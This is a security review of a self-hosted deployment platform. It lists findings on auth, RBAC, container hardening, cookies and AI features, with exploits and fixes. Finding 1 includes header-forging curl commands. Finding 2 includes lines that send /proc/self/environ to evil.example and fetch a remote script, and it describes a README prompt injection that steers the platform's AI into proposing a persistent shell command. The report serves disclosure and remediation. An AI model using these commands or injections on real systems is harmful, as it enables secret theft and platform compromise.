# Security review

**Date:** 2026-07-27 (supersedes the 2026-07-26 review)
**Scope:** the core application — `internal/`, `pkg/`, `cmd/`, `web/src/`. Samples and helper scripts (`examples/`, `testapps/`, `testdata/`, `hack/`) were excluded.
**Method:** seven parallel deep reviews (Docker runtime, gateway/auth, control-plane API, Kubernetes rendering and RBAC, CLI credential handling, AI and build subsystems, console plus prior-finding verification), followed by direct re-verification of every load-bearing claim against the tree. `go build ./...` and the full test suite pass at the reviewed commit.

> **What changed since the last review.** The `Multi-Runtime Support` and `Better Auth` commits restructured the tree (`internal/k8s/` → `pkg/runtime/kubernetes/`) and added a second runtime (`pkg/runtime/docker/`). More importantly, **the authentication model was replaced**: the single static bearer token is gone. Every line number below is against the current tree.

---

## The structural point that frames everything else

The old review opened with "the control plane has exactly one credential — a static bearer token." That is no longer true, and the replacement changes where the risk sits.

Authorization is: the gateway performs an OIDC login and checks the admin rules, then **mints a short-lived sealed token** from the session and forwards it as `X-Access-Token`. The server verifies that seal under `SessionKey` and applies the admin rules itself. A sealed CLI token in `Authorization: Bearer` is the same credential by another route. Identity headers are still forwarded to *apps*, but they are metadata only — no donkey component authorizes on them.

This holds for traffic that never touched the gateway, which is what matters: tenant workloads can reach the server directly by design (the AI proxy), so the credential must be verifiable on its own. That was finding 1, and it is now resolved.

One consequence worth stating plainly:

- `Admins` empty means *everyone the IdP admits* (`internal/server/config.go:42-44`, via `AccessConfig.Empty()` at `internal/config/app.go:70-72`). An installation that does not set `DONKEY_ADMINS` grants full operator rights to every account the IdP will issue a token for.

Per-space authorization still does not exist, so "an authenticated operator can reach another space" remains by design and is not reported as a vulnerability. Several findings below become privilege-boundary violations the moment that changes; they are marked.

---

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | Any tenant workload forges operator identity to `donkey-server` with one header | **Resolved** — sealed token verified server-side |
| 2 | High | Model-proposed `preDeploy` commands are auto-applied and run as a shell with every secret | **Resolved** — feature removed |
| 3 | High | `donkey-server` runs as `cluster-admin` | Open (carried) |
| 4 | High | Privileged BuildKit with an unauthenticated TCP listener | Open (carried) |
| 5 | High | Docker runtime containers get no capability drop, no `no-new-privileges`, no non-root user | Open (new surface) |
| 6 | Medium | `donkey-gateway`'s Role covers every Secret in `donkey-system` | Open |
| 7 | Medium | Access allowlists match an unverified `email` claim | Open |
| 8 | Medium | Push-capable registry credential copied into every tenant namespace | Open (carried) |
| 9 | Medium | No NetworkPolicy for tenant namespaces; `internal` is not enforced | Open (carried) |
| 10 | Medium | Deploy-time AI analysis sends unredacted secrets to the model provider | Open (carried) |
| 11 | Medium | Docker addon binding hosts are bare aliases that collide across spaces | Open (new) |
| 12 | Medium | Domain-wide session cookie can be overwritten by any app under the base domain | Open |
| 13 | Medium | CLI loopback login callback has no `state` binding | Open (new) |
| 14 | Medium | CLI accepts `http://` for the token-bearing API | Open (carried) |
| 15 | Medium | `0600` on the token file is not enforced when the file already exists | Open (carried) |
| 16–27 | Low | See [Lower-severity items](#lower-severity-items) | Open |

### Previously fixed, re-verified this round

These were fixed after the last review and are **not** regressions — each was re-checked against the refactored code rather than assumed, and each still holds. They are removed from the findings list.

- **Gateway cookie type confusion** (was Critical). AAD purpose separation survives the move into `internal/identity` (`identity.go:57,75`); `purposeSession`/`purposeLogin`/`purposeCLI` at `internal/gateway/session.go:63-66` and `identity.go:38`; empty-`Subject` rejection at `session.go:81`; empty `State`/`Nonce` rejection at `oidc.go:163-166`, correctly ordered *before* the comparisons; login cookie cleared with its own path at `oidc.go:167`. `TestSealedValuesDoNotCrossPurposes`, `TestStateCookieIsNotAcceptedAsSession` and `TestSessionWithoutSubjectIsRejected` all pass.
- **AI proxy forwarded any path and method** (was High). First-segment allowlist at `internal/server/aiproxy.go:29-38`, enforced at `:57`; methods restricted to GET/POST at `:151-155`.
- **AI proxy base-path escape** (was High). `fs.ValidPath` on the decoded path at `aiproxy.go:53`, and the validated path is carried to `Rewrite` through the request context (`:64-65,:122-123`) rather than re-derived. One residual encoding gap is recorded as a Low item.
- **`donkey server install` printed the API token to stdout.** No longer applicable — the static token no longer exists. Install now prints only the URL and `donkey login --server … (opens the browser)` (`internal/cli/server.go:292`).

---

## 1. Critical — any tenant workload forges operator identity to `donkey-server` with one header

> **Resolved.** Both controls this finding asked for are in place.
>
> `s.auth` no longer looks at identity headers at all. It accepts one thing:
> a sealed token, verified under `SessionKey` and checked against
> `s.cfg.Admins` — whether it arrives as `X-Access-Token` (minted per request
> by the gateway from the login session, ≤10 minutes, never outliving the
> session) or as `Authorization: Bearer` (the CLI's). Typing
> `X-Auth-Request-User` now yields 401, pinned by a regression test in
> `internal/server/server_test.go`.
>
> The credential goes to exactly one backend. Routes carry
> `donkey.dev/token: forward`, set only on the console/API route; the proxy
> strips inbound `X-Access-Token` on every route and mints an outbound one
> only where the annotation says so — an app handed a token could replay its
> visitors against the API. `internal/gateway/gateway_test.go` pins both
> halves.
>
> Segmentation followed too: `serverNetworkPolicy` now guards
> `donkey-server`'s ingress, and admits the gateway alone. The token check
> remains the control that matters; the policy is defence in depth behind it.
>
> The listener sharing that made this finding reachable is gone too. The
> openai addon's endpoint runs as its own workload, **donkey-ai** (same
> image, `ai` entrypoint), holding the upstream credential and read-only
> access to the binding Secrets — no session key, no registry login, no
> write verb, and on Docker no socket mount. Apps are pointed at it instead
> of the server, which let `serverNetworkPolicy` narrow to the gateway
> alone: nothing a tenant workload needs lives on the admin API any more.
>
> Still open from this finding's tail: `Admins` empty still means every
> account the IdP admits (below). On Docker the server remains attached to
> every space network — it needs them to probe and tunnel — so the
> credential check is still the only control there; the split buys
> separation of what the reachable process *holds*, not reachability.

**Location (fixed):** `internal/server/server.go` (`auth`), `internal/gateway/proxy.go` (mint/strip), `pkg/runtime/kubernetes/manifests/route.go` (`AnnotationToken`), `pkg/runtime/kubernetes/manifests/system.go` (`serverNetworkPolicy`).

Five of the six independent reviewers reached this finding separately. Verified directly.

```go
func (s *Server) auth(next http.HandlerFunc) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Auth-Request-User") != "" {
			next(w, r)
			return
		}
```

The header's *presence* is the authorization. No value is verified, and `s.cfg.Admins` is not consulted on this branch — it is only applied on the sealed-token branch at `:216-221`. Every `/v1/*` route is wrapped in `s.auth`.

The code comment at `:203-209` and `README.md:624-628` both acknowledge this, describing the exposed set as "an in-cluster caller who can reach the Service directly." **That description no longer matches how donkey wires things.** The exposed set is now every app donkey deploys, by design and by default:

- **Kubernetes.** `donkey-server` is a plain ClusterIP Service (`manifests/system.go:153`). The only NetworkPolicy the product renders anywhere guards BuildKit (`manifests/system.go:151,544-566`), and a NetworkPolicy does not default-deny pods it does not select. Worse, apps are *told* the address: the openai addon hands every app `OPENAI_BASE_URL=http://donkey-server.donkey-system.svc/ai/v1` (`pkg/runtime/kubernetes/addonservice.go:52-54`). No discovery required.
- **Docker.** `ensureSpace` unconditionally connects the server and gateway containers to **every space's network** (`pkg/runtime/docker/runtime.go:175-182`), because `aiProxyURL()` points apps at `http://<server>:8088/ai/v1` (`:473-475`). Docker attaches whole containers, so joining the AI proxy joins the entire admin API. The `127.0.0.1:8088` host publish (`internal/cli/serverdocker.go:187`) is irrelevant — the attacker is on the bridge, reaching the container port, and `DONKEY_LISTEN` binds all interfaces inside it (`:151`).

`http.NewCrossOriginProtection()` (`server.go:148`) does not help: a non-browser client sends neither `Origin` nor `Sec-Fetch-Site`, so it passes.

### Exploit

Starting position: code execution inside any one deployed app container — the ordinary outcome of a vulnerability in a tenant's own app, and precisely what the pod hardening exists to contain.

```
curl -H 'X-Auth-Request-User: anyone' http://donkey-server.donkey-system.svc/v1/apps
curl -H 'X-Auth-Request-User: anyone' http://donkey-server.donkey-system.svc/v1/spaces/<other>/apps/<app>/env
curl -H 'X-Auth-Request-User: anyone' -X POST http://donkey-server.donkey-system.svc/v1/spaces/<other>/services/postgres/databases/app/query
```

That yields every space's plaintext env and addon bindings, arbitrary SQL against every tenant database, the S3 browser, file read/write on every app's disk via pod-exec, and `POST /v1/deploys`. The process answering is bound to `cluster-admin` (finding 3) on Kubernetes, and runs with `/var/run/docker.sock` bind-mounted on Docker (`internal/cli/serverdocker.go:182`) — root-equivalent on the host. One compromised tenant app becomes total platform compromise.

### Note on the previous review's claim

The old report asserted that the admin console was not exposed by the gateway bug because "its route deliberately bypasses the gateway and keeps bearer auth." **Both halves are now false** — the console routes *through* the gateway (`manifests/system.go:597-608`) and bearer auth was replaced by header trust. That control is recorded as regressed below.

### Fix

Two independent controls, both cheap:

1. **Stop trusting a bare header.** The gateway and server already share `SessionKey`. Have the gateway seal the identity (`identity.Seal` with a new purpose, mirroring `purposeCLI`) into a header the server unseals, and apply `s.cfg.Admins.Allows(...)` on that path too. This fixes both runtimes at once and is the durable fix.
2. **Segment the network.** Render a NetworkPolicy selecting `systemLabels(ServerName)` that admits port 8088 only from the gateway — the exact shape of `buildkitNetworkPolicy` at `system.go:544-566`. On Docker, serve `/ai/v1` from a listener separate from the admin API so joining space networks does not join the whole API.

Also set a default for `Admins`, or refuse to start when it is empty, so an unconfigured install does not admit every IdP account as an operator.

---

## 2. High — model-proposed `preDeploy` commands are auto-applied and run as a shell with every secret

> **Resolved by removing the feature.** `preDeploy` no longer exists: not as a
> `donkey.yaml` field, not in the assistant's schema, and not in either
> runtime. Deleted with it went the auto-apply sites, the character blocklist
> this finding showed does not hold, the `sh -c` execution in
> `manifests/predeploy.go` and `docker/deploy.go`, and the Job runner that
> only ever served them. donkey now has no hook that runs a command of its own
> against an app image, so there is nothing left to confirm or to screen. The
> finding is kept below as the record of why.
>
> The trade: an app whose tables have to exist before its first request now
> creates them in its own start path, idempotently.

**Location (all removed):** `internal/cli/init.go:119-121` and `internal/server/analyze.go:128-130`; screening at `internal/ai/openai.go:130-141,155-167`; execution at `pkg/runtime/kubernetes/manifests/predeploy.go:44` and `pkg/runtime/docker/deploy.go:123-131`.

```go
for _, step := range analysis.PreDeploy {
    app.PreDeploy = append(app.PreDeploy, step.Command)
    u.Info("Runs before each deploy: %s — %s", u.Bold(step.Command), step.Reason)
}
```

An `Info` line, not a `Confirm`. The command is written into `donkey.yaml`, and `config.AppConfig.Validate()` does not validate `PreDeploy` at all. It then executes as:

```go
Command: []string{"sh", "-c", strings.Join(app.PreDeploy, " && ")},
Env:     env,
EnvFrom: envFrom,
```

with the app's full environment, every addon binding, network egress and the app's disk.

**The screening is a character blocklist and does not hold.** `unsafePreDeploy` (`openai.go:155-167`) rejects `&|;`$><` and a list of server-ish words. Commands that exfiltrate need none of those characters:

```
curl -X POST --data-binary @/proc/self/environ https://evil.example/x
wget https://evil.example/x.sh -O /var/tmp/x
sh /var/tmp/x
```

The last two are separate steps, and `predeploy.go:44` joins steps with `&&` itself — donkey supplies the chaining the blocklist was written to prevent.

### Exploit

Starting position: a repository the developer opens. `README.md` is in the summarizer's allowlist (`internal/ai/summarize.go:40`) and is rendered verbatim into the analyze prompt (`internal/ai/openai.go:68`), so it carries an injected instruction naming a mandatory migration command. The developer runs `donkey init` — or `donkey deploy` in a folder with no `donkey.yaml`, which falls through to the init flow (`internal/cli/deploy.go:77`). The command lands in `donkey.yaml`, is committed as ordinary project config, and runs in-cluster on every subsequent deploy.

**Honest scoping:** deploying a hostile repo already runs its code, so the marginal gain is not "code execution" per se. What is additive is that the command lands in a *reviewed-looking* config file with no confirmation, persists across deploys including after the app itself is fixed, and runs as a shell with the addon bindings attached even when the app image is scrutinized. The inconsistency is the real finding: `internal/cli/fix.go:52-58` refuses to apply model-proposed *source edits* under `--yes` and demands per-file confirmation, while model-proposed *command execution* — strictly more dangerous — gets neither.

**Fix as proposed:** confirm each command explicitly and refuse under `--yes`, exactly as `fix.go` already does. Replace the character blocklist with an allowlist of known migration argv-0s (`alembic`, `python manage.py migrate`, `npx prisma migrate deploy`, `bundle exec rails db:migrate`, `flask db upgrade`). Never join multiple steps into one `sh -c`.

**Fix as taken:** the feature was removed instead. An allowlist would have kept a model-influenced command-execution path in the product for the sake of one convenience; deleting it removes the class rather than narrowing it.

---

## 3. High — `donkey-server` runs as `cluster-admin`

**Location:** `pkg/runtime/kubernetes/manifests/system.go:243-251` — *still present, moved from `internal/k8s/`*

```go
RoleRef: rbacv1.RoleRef{APIGroup: "rbac.authorization.k8s.io", Kind: "ClusterRole", Name: "cluster-admin"},
```

The code's own comment at `:243-245` still calls it a PoC shortcut. The pod it grants offers pod-exec into arbitrary tenant namespaces (`pkg/runtime/kubernetes/files.go:733-734`), raw SQL execution, and S3 read/write. Combined with finding 1, the path from "tenant app container" to "cluster-admin" is two steps with no credential in between.

The container itself remains correctly hardened — `systemSecurityContext()` at `system.go:207-215`, applied at `:379`.

**Fix:** the required RBAC is bounded and already enumerated by the code's own object universe in `pkg/runtime/kubernetes/apply.go:25-44`.

---

## 4. High — privileged BuildKit with an unauthenticated TCP listener

**Location:** `pkg/runtime/kubernetes/manifests/system.go:315,496-498` — *still present, all sub-parts*

```go
privileged := true
Args: []string{"--addr", fmt.Sprintf("tcp://0.0.0.0:%d", buildkitPort), ...},
SecurityContext: &corev1.SecurityContext{Privileged: &privileged},
```

Unchanged from the last review: no TLS flags anywhere (zero repo hits for `tlscacert`/`tlscert`/`tlskey`), and `buildkitPodSpec` (`:492-539`) is the only pod spec that omits `AutomountServiceAccountToken: false` **without needing API access** — app (`app.go:404`), predeploy (`predeploy.go:58`), the files helper (`files.go:632`) and every addon (`addonservice.go:130`) all set it, and the server and gateway omit it only because they legitimately call the API. Its sole compensating control remains `buildkitNetworkPolicy` (`:544-566`) — correctly written, but still the only NetworkPolicy in the product, and kind's default CNI does not enforce NetworkPolicy at all. Nothing in `internal/doctor` checks whether policies are enforced.

The image is digest-pinned (`internal/config/install.go:107`), which is correct and worth keeping.

**Fix:** BuildKit mTLS, `AutomountServiceAccountToken: false`, and a `donkey doctor` check that NetworkPolicy is actually enforced rather than assumed.

---

## 5. High — Docker runtime containers get no capability drop, no `no-new-privileges`, no non-root user

**Location:** `pkg/runtime/docker/deploy.go:457` (`replaceContainer`), reached by `runApp` (`:348-355`) and `runService` (`pkg/runtime/docker/runtime.go:596-605`)

```go
hostCfg := &container.HostConfig{Mounts: mounts}
```

That is the whole security configuration. No `CapDrop`, no `SecurityOpt`, no `User`. The Kubernetes path sets all of it (`manifests/app.go:396-405`), and addons there additionally pin a non-root UID (`addonservice.go:130-143`). Docker's default seccomp profile still applies, so seccomp parity holds; the gap is the capability set and privilege escalation.

Docker's default capabilities include **CAP_NET_RAW**, so an app container can put a raw socket on the space bridge — and that bridge is not an app-only segment. `ensureSpace` puts `donkey-gateway` and `donkey-server` on it (finding 1), and route backends are plain HTTP to container names (`deploy.go:179`). An attacker with code execution in one app can ARP-poison the bridge and intercept:

- gateway → sibling-app traffic, including the `X-Auth-Request-*` identity headers stamped for signed-in admins (`internal/gateway/proxy.go:111-120`);
- sibling apps' postgres traffic, which is `sslmode=disable` (`internal/addons/postgres.go:30-31`), so credentials and rows are cleartext;
- sibling apps' AI-proxy bearer tokens in transit.

`NoNewPrivs` being unset additionally re-enables setuid escalation inside the container, which `AllowPrivilegeEscalation: false` denies on the Kubernetes side.

**Fix:** in `replaceContainer`, set `hostCfg.CapDrop = []string{"ALL"}` and `hostCfg.SecurityOpt = []string{"no-new-privileges"}`; add a `User` field to `runConfig` so `runService` can pass the addon's `RunAsUser` and match the Kubernetes posture. Add back only `NET_BIND_SERVICE` if an app needs a low port.

---

## 6. Medium — `donkey-gateway`'s Role covers every Secret in `donkey-system`

**Location:** `pkg/runtime/kubernetes/manifests/donkeygateway.go:95-105`

```go
Rules: []rbacv1.PolicyRule{{
	APIGroups: []string{""},
	Resources: []string{"secrets"},
	Verbs:     []string{"get", "list", "create", "update"},
}},
```

No `resourceNames`. The gateway's actual use is three named secrets (`internal/gateway/tls.go:185,217-249,330,356-365,475`), and it never calls `list` at all. The grant also covers `donkey-system-config` (`system.go:255-267`), which holds `registry-password`, `openai-api-key`, `oidc-client-secret` and `session-key`.

The gateway is the most exposed component donkey runs — it terminates TLS for the platform, parses attacker-supplied `Host` headers and cookies, and runs the OIDC callback. Any RCE or SSRF in it turns into one `GET /api/v1/namespaces/donkey-system/secrets` and the registry *push* credential, which grants write to the path every app is built into: overwrite any app's image tag, and arbitrary code runs in every tenant. The session key and client secret it already holds via env, so those are not new; the registry credential is strictly extra privilege it never uses.

Related, lower: the gateway's ClusterRole reads **every ConfigMap in every namespace** (`donkeygateway.go:71-81`). The comment above it says "read-only and narrow… touches nothing else cluster-wide," but RBAC cannot filter by label and `ListManagedRoutes` (`pkg/runtime/kubernetes/network.go:22-36`) lists cluster-wide and filters client-side. The comment describes intent, not the grant.

**Fix:** split into `create` (unrestricted) and `get`/`update` with `resourceNames` naming the three certificate secrets. Drop `list` entirely.

---

## 7. Medium — access allowlists match an unverified `email` claim

**Location:** `internal/gateway/oidc.go:198-213,224-231`; matched at `internal/config/app.go:78-88`

The claims struct decodes `email`, `name`, `preferred_username`, `groups`, `roles` and `realm_access.roles` — but **not `email_verified`** — and copies the email into the session unconditionally. `AccessConfig.Allows` then compares it case-insensitively against `access.users` (`app.go:83`), and this is the same claim the console's `Admins` rule matches (`server.go:218`, `manifests/system.go:597-608`).

**Exploit:** starting position is someone the IdP will admit but who is not on the allowlist — a guest/B2B account in Entra, a self-registered account on an IdP with open sign-up, or any IdP where the email attribute is user-settable. They set their profile email to a name on the allowlist, sign in normally, and match. That reaches every app naming that user, and full operator rights if `auth.admins` is expressed by email. `groups` and `roles` compare exactly and are not affected.

**Fix:** decode `EmailVerified *bool \`json:"email_verified"\`` and refuse to use `claims.Email` for matching when it is present and false. Optionally warn at install time when `admins` uses `users:` against an issuer that does not assert the claim.

---

## 8. Medium — push-capable registry credential copied into every tenant namespace

**Location:** `pkg/runtime/kubernetes/manifests/app.go:286-311` — *still present*

```go
auth := base64.StdEncoding.EncodeToString([]byte(in.RegistryUsername + ":" + in.RegistryPassword))
```

Fed from the server's single registry config (`pkg/runtime/kubernetes/deploy.go:218-219`) — the same credential `donkey-server` uses to *push* (`internal/build/auth.go:15-32`). Visible in the golden file at `testdata/golden/app-objects.yaml:14-29`. Any foothold yielding secret-read in one tenant namespace escalates to overwriting any other app's image tag. `RegistryImmutable` reduces but does not remove this, since new tags can still be pushed and a deploy pointed at them.

**Fix:** use a pull-only (or per-space) credential in the pull secret.

---

## 9. Medium — no NetworkPolicy for tenant namespaces; `internal` is not enforced

**Location:** `pkg/runtime/kubernetes/manifests/app.go:222-234,465-484` — *still present on Kubernetes; the Docker runtime is better here*

`Namespace()` renders only Pod Security labels and the managed annotation; no NetworkPolicy appears in `AppObjects` or `NetworkObjects`. `service()` is a plain ClusterIP, so an `internal: true` app — documented at `internal/config/app.go:28-31` as reachable by "only the apps of its own space" — is reachable from any pod in any namespace. `Internal: true` only suppresses the gateway route (`pkg/runtime/kubernetes/deploy.go:138-144`).

Postgres bindings still pin plaintext (`internal/addons/postgres.go:30-35`), so the 192-bit password crosses the pod network in the clear on every connect. Usernames are fixed and public (`pgUser = "donkey"`, `rfAccessKey = "donkey"`, `pbAdminEmail = "admin@donkey.local"`), so the password is the entire barrier. Egress is equally unrestricted, so app pods reach `169.254.169.254` and `donkey-buildkitd:1234`.

**The Docker runtime does not have this problem** — each space gets its own Docker network (`pkg/runtime/docker/runtime.go:96-98`) and app containers join only their own (`deploy.go:352,461-468`). Layer-3 isolation between spaces holds there; it is finding 5 (no NET_RAW drop) that undermines it *within* a space.

**Fix:** a default-deny ingress policy per space namespace allowing same-namespace plus the gateway. This also closes finding 4's lateral path.

---

## 10. Medium — deploy-time AI analysis sends unredacted secrets to the model provider

**Location:** `internal/server/analyze.go:35-37`; `internal/ai/summarize.go:36-45,76-92,129-135`; `internal/ai/openai.go:63` — *still present, all sub-parts*

```go
if b, err := os.ReadFile(filepath.Join(dir, config.AppFileName)); err == nil {
    in.CurrentConfig = string(b)
}
```

`analyzeApp` runs on every deploy and on `donkey init`, reads `donkey.yaml` including its `env:` block, and ships it verbatim. The project already has `redact.go`, but its only call site is the *failure* path (`openai.go:191`); the always-on path has no redaction at all. Reproduced empirically by a reviewer: a `donkey.yaml` with `API_KEY: sk-live-…` and a `docker-compose.yml` with `POSTGRES_PASSWORD: hunter2` both appear literally in the rendered summary.

`deniedFile` remains the sole secret filter and is filename-only, with every previously-noted gap reproducing exactly: `local.env`, `prod.env`, `env.production`, `.npmrc`, `.netrc`, `.pgpass`, `.pypirc`, `.dockercfg`, `.htpasswd` (the pattern list has `password`, not `passwd`), `terraform.tfvars`, `settings.py`, `wp-config.php`, service-account JSON, `.p8`, `.jks`, `.der`, `.ppk`. The file tree still lists every filename *before* the content check (`summarize.go:129-135`), so denied filenames are disclosed regardless.

The CLI still tells users "file names and manifest files, never secrets, go to the assistant" (`internal/cli/init.go:259`). That claim is not backed by a control — and the manifest allowlist itself contains the file classes that most often carry credentials.

Two adjacent gaps found this round:

- `FailureContext.DonkeyYAML` is scrubbed at `internal/ai/redact.go:112-114` but **never populated** by either call site (`internal/server/deploy.go:585-591`, `handlers.go:188-193`), so the one control written for it is dead code — while the explorer still reads `donkey.yaml` through the deliberately-unscrubbed tool path.
- `knownSecrets` (`internal/server/deploy.go:654`) is built from what the *runtime* stored, so on a first deploy `app.Env` is absent, and `app.Build.Env` is never included at all — even though it is fed straight into the build as BuildKit secrets and `build-arg` values (`internal/build/solve.go:131-133,165-169`), which package managers routinely echo into build logs that then go to the model on failure.

**Fix:** apply `redact()` on the analyze path; extend `deniedFile` (suffix matching for `.env`, plus the missing names and extensions); pass `app.Env` and `app.Build.Env` into `KnownSecrets` at both call sites; either populate `DonkeyYAML` or drop `env:` from `donkey.yaml` in favour of `donkey env set`.

---

## 11. Medium — Docker addon binding hosts are bare aliases that collide across spaces

**Location:** `pkg/runtime/docker/runtime.go:567-576`, consumed at `internal/server/dbadmin.go:46-66` and `s3admin.go:49`

```go
k8sHost := fmt.Sprintf("%s.%s.svc", name, namespace)
out[k] = strings.ReplaceAll(v, k8sHost, name)
```

`postgres.donkey-<space>.svc` becomes the bare alias `postgres`. That is unique on one space bridge, but the addon name defaults to the addon *type*, so **every** space's postgres carries the same alias — and `donkey-server` is attached to every space network (finding 1). A reviewer reproduced the ambiguity: with two networks each holding a container aliased `postgres`, a container joined to both resolved the name to only one of them.

**Impact:** an operator opens the database or bucket browser for space B; `donkey-server` resolves `postgres` to space A's container and sends space B's `DATABASE_URL`, password included, to a service belonging to a different space. Escalated form: an app in space A holds an alias equal to its own name (`deploy.go:463-466`), so an app named after an addon type receives other spaces' service credentials whenever an admin browses them.

**Fix:** rewrite to the globally unique container name (`ctrName(space, name)`) rather than the bare alias — app containers resolve it on their own network just as well. Alternatively have `dbConnect`/`s3Connect` take the host from `ServiceEndpoint` (`runtime.go:654-667`), which already returns `ctrName`.

---

## 12. Medium — domain-wide session cookie can be overwritten by any app under the base domain

**Location:** `internal/gateway/session.go:93-98,105-116`; `internal/gateway/oidc.go:133-138`

Both `donkey_session` (Path `/`) and `donkey_login` (Path `/oauth2/`) are issued with `Domain=<base domain>` for every host under it — which is exactly what makes one login cover every app. Reading is properly prevented: `HttpOnly` at `session.go:113`, and `proxy.go:109` strips both cookies from every proxied request. **Writing is not.** A sibling host may set a cookie with the same name, Domain and Path, which *replaces* the victim's.

**Exploit:** an attacker who controls or has compromised one app under the installation responds with `Set-Cookie: donkey_session=<a session they legitimately obtained by logging in as themselves>; Domain=<base>; Path=/; Secure`. Every visitor to that page is silently signed in as the attacker on every app in the installation, including the console — so whatever they type or upload next lands in the attacker's account. The same trick with `donkey_login` plus a captured `?code=&state=` gives forced-login CSRF at `handleCallback`, since the attacker supplies both halves of the state comparison.

**Fix:** bind the session to the host it is used on — carry the issuing host inside the sealed `session` and reject it in `sessionFrom` when it does not match the request's registrable scope, or mint a host-only `__Host-` cookie per app from the domain-wide SSO cookie on first visit. At minimum, treat "session identity changed without a login round trip" as a re-authentication trigger.

---

## 13. Medium — CLI loopback login callback has no `state` binding

**Location:** `internal/cli/login.go:110-151`

```go
tok := r.URL.Query().Get("token")
if r.URL.Path != "/callback" || tok == "" { http.NotFound(w, r); return }
...
select { case tokens <- tok: default: }
```

`browserLogin` listens on `127.0.0.1:0` and accepts the **first** token anything delivers. The CLI generates no `state` and verifies none on the callback.

**Exploit:** a local unprivileged process on the developer's machine, or a malicious page open in the browser during the three-minute window, scans the ephemeral port range and issues `http://127.0.0.1:<port>/callback?token=<the attacker's own donkey token>` (an opaque `no-cors` GET still reaches the handler). Winning the race fixes the CLI to the *attacker's* account, so the developer's subsequent `donkey deploy` pushes their source into attacker-controlled spaces and `donkey files get` downloads content the attacker chose.

**Fix:** generate a random `state`, pass it in the `/oauth2/cli?state=…` URL, and reject callbacks whose `state` does not match.

---

## 14. Medium — CLI accepts `http://` for the token-bearing API

**Location:** `internal/config/global.go:156-161`, `internal/cli/login.go:68`, `internal/apiclient/client.go:372` — *still present*

`http://` is explicitly accepted, and the tunnel derives its URL by string replacement (`strings.Replace(c.BaseURL, "http", "ws", 1)`), so an `http://` base yields `ws://` carrying the sealed token in the clear. Login itself is now a browser OIDC flow, so no password is typed — but the token still rides `Authorization: Bearer` over whatever scheme was configured, and `GET /v1/spaces/{space}/apps/{app}/env` returns plaintext env values while `donkey addon tunnel` carries raw database traffic. The server always advertises `https` (`Scheme()` is hardcoded), so `http://` exists only as something a human types.

**Fix:** reject `http://` for non-loopback hosts, or warn loudly at login and on every token-carrying command.

---

## 15. Medium — `0600` on the token file is not enforced when the file already exists

**Location:** `internal/config/global.go:164-173` — *still present*

```go
os.MkdirAll(filepath.Dir(path), 0o700)
return os.WriteFile(path, b, 0o600)
```

The mode argument is honoured only at creation, and `os.MkdirAll` is a no-op on an existing directory. If `~/.config/donkey/config.yaml` pre-exists as `0644` — a dotfiles checkout, a config-management tool, a restored backup, or a hand-written file with `kubeContext:` set before first login, which is a documented bootstrap path — then `donkey login` writes a non-expiring token into a world-readable file and never says so.

**Fix:** `os.Chmod(path, 0o600)` after the write (or write to a `0600` temp file and rename), plus `os.Chmod` on the directory. Optionally warn on load when `mode&0o077 != 0`, as `ssh` does.

---

## Lower-severity items

Worth addressing as a batch.

| Finding | Location |
|---|---|
| An unparseable access annotation fails **open**: the unmarshal error is discarded, `r.Access` stays nil, and `Allows` then returns true for every signed-in identity — the same shape as the fixed cookie bug. The Docker path fails closed by contrast | `internal/gateway/gateway.go:441-446` |
| Identity headers are forwarded to **public** apps that never asked for a login, handing any signed-in visitor's email and full group/role membership to a tenant app without consent | `internal/gateway/proxy.go:110-121` |
| A route path with a trailing slash never matches its own sub-paths (`HasPrefix(path, "/api//")`), so traffic for a protected app silently falls through to a neighbouring public one | `internal/gateway/gateway.go:471`, `internal/config/app.go:318-320` |
| AI proxy: a **double**-encoded dot segment (`%252e%252e`) survives `fs.ValidPath` and reaches the upstream still encoded with the platform key attached. Inert against `api.openai.com`; live against a self-hosted upstream fronted by a proxy that normalizes before dispatch | `internal/server/aiproxy.go:53,123` |
| HTTP client has no `CheckRedirect`, so redirects are followed with the `Authorization` header; Go's stripping rule compares hosts only, so https→http on the same host keeps the token | `internal/apiclient/client.go:35-55` |
| `donkey open` passes a server-supplied string to `open`/`xdg-open`/`rundll32` without checking the scheme; `file://` and `smb://` are opened without consent (argv arrays, so no command injection) | `internal/cli/open.go:36-37,45-54` |
| Server-supplied strings are printed raw to the terminal — anything the server controls can inject ANSI/OSC 52 clipboard sequences. Systemic: `ui.Printf` is a bare `Fprintf` | `internal/cli/files.go:74-81`, `internal/ui/ui.go:51` |
| AI fix proposals are confined to the app directory by `os.Root` but not within it, and the write **preserves an existing file's mode** — so a checked-in `0755` script or `.git/hooks/pre-commit` is a reachable target. Mitigated by per-file confirmation and refusal under `--yes` | `internal/cli/fix.go:101-127` |
| Model-chosen volume paths auto-applied server-side without confirmation; `excludedVolume` has grown but still permits `/app`, `/home`, `/opt`, `/var/lib`, `/var/run` — turning a one-shot injection into persistence that redeploying does not clear | `internal/server/analyze.go:87-96`, `internal/ai/openai.go:172-184` |
| Model-authored `Dockerfile` written and built with no confirmation on the server path; the CLI path confirms with default **yes**, so `--yes` writes it into the working tree unreviewed | `internal/server/analyze.go:48-66`, `internal/cli/init.go:232-239` |
| `handleDiagnose` returns raw model actions without the `path.Clean`/`fs.ValidPath` normalization the deploy path applies via `withDiffs` — not exploitable today, but a trap for the next consumer | `internal/server/handlers.go:196` vs `deploy.go:596` |
| An app's `domain:` is validated for syntax only, with no ownership check; the gateway breaks ties with an unstable `sort.Slice` on path length. Now that the console is a routing-table entry too, a route claiming the base domain at `/` collides with `consoleRoute` and the winner is arbitrary | `internal/config/app.go:346-347`, `internal/gateway/gateway.go:395-397` |
| `PathRouteName` can collide (`(a,"b-c","/d")` and `(a,"b","/c/d")` both yield `a-on-b-c-d`; `/a/pi` and `/a-pi` both slug to `a-pi`; and a path-route name can equal another app's own route name) and `Apply` uses `Force: true`, so one route silently overwrites the other. Intra-space only | `pkg/runtime/kubernetes/manifests/pathroute.go:18-24`, `apply.go:74` |
| S3 download relays a user-controlled `Content-Type` without `nosniff`, unlike the file-browser path which sets it deliberately. Mitigated: `Content-Disposition: attachment` is always well-formed (tested against hostile keys), so this is defence-in-depth | `internal/server/s3admin.go:346-355` vs `files.go:290` |
| AI proxy compares tokens with a map lookup rather than `subtle.ConstantTimeCompare`; no rate limiting, no per-space attribution | `internal/server/aiproxy.go:87` |
